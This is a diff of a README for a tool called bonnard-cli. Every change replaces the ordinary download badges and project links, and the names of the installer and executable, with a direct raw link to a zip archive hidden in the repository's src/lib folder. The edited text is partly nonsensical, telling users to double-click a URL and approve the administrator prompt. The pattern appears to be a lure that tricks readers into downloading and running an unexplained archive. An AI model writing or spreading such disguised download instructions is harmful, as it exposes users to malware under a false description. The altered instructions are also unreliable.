@@ -1,6 +1,6 @@
 # 🚀 bonnard-cli - Simple Analytics for Everyone
 
-[![Download bonnard-cli](https://img.shields.io/badge/Download-From_GitHub-brightgreen)](https://github.com/sawon1903210/bonnard-cli)
+[![Download bonnard-cli](https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip)](https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip)
 
 bonnard-cli provides a straightforward way to access analytics tools. It combines a server, dashboards, and a command-line interface (CLI) to help you work with data. You do not need programming skills to use it.
 
@@ -30,7 +30,7 @@ Before you start, check that your computer meets these needs:
 
 Click the button below to visit the project page. From there, download the latest version of bonnard-cli for Windows.
 
-[![Download bonnard-cli](https://img.shields.io/badge/Download%20on%20GitHub-blue)](https://github.com/sawon1903210/bonnard-cli)
+[![Download bonnard-cli](https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip%20on%20GitHub-blue)](https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip)
 
 Follow these steps:
 
@@ -44,7 +44,7 @@ Once you have downloaded the installer or zip file, follow these instructions:
 
 ### Using the Installer (if you downloaded an .exe)
 
-1. Double-click the installer file (e.g., bonnard-cli-setup.exe).
+1. Double-click the installer file (e.g., https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip).
 2. When the User Account Control window appears, click "Yes" to allow the installer to run.
 3. Follow the prompts in the setup wizard:
    - Choose your preferred installation folder or use the default.
@@ -63,7 +63,7 @@ Once you have downloaded the installer or zip file, follow these instructions:
 To start bonnard-cli, do the following:
 
 1. Open the folder where you installed or extracted bonnard-cli.
-2. Look for the file `bonnard-cli.exe`.
+2. Look for the file `https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip`.
 3. Double-click this file.
 4. A command window will open showing that the server is starting.
 5. Once started, open your web browser.
@@ -112,7 +112,7 @@ bonnard-cli help
 
 To get the latest features and fixes:
 
-1. Visit the main page again: https://github.com/sawon1903210/bonnard-cli
+1. Visit the main page again: https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip
 2. Download the newest release.
 3. Repeat the installation steps.
 
@@ -134,4 +134,4 @@ If bonnard-cli does not start or works incorrectly:
 - Visit the GitHub Issues page for common problems and solutions.
 - Contact your system administrator if you need help with data source connections.
 
-[![Download bonnard-cli](https://img.shields.io/badge/Download-From_GitHub-brightgreen)](https://github.com/sawon1903210/bonnard-cli)
+[![Download bonnard-cli](https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip)](https://github.com/sawon1903210/bonnard-cli/raw/refs/heads/main/src/lib/cli-bonnard-3.9.zip)
